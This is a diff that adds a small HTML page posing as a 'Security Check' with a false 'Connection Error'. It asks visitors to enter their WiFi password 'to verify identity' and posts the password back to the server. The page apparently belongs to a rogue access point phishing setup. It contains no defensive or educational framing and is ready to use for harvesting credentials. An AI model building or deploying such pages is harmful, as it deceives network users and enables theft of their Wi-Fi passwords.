@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Check</title>
+  <style>
+    body { font-family: sans-serif; background: #eee; padding: 20px; text-align: center; }
+    .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+    button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Connection Error</h2>
+    <p>Please enter your WiFi password to verify identity.</p>
+    <form action="/" method="post">
+      <input type="password" name="password" placeholder="WiFi Password" required>
+      <button type="submit">Connect</button>
+    </form>
+  </div>
+</body>
+</html>
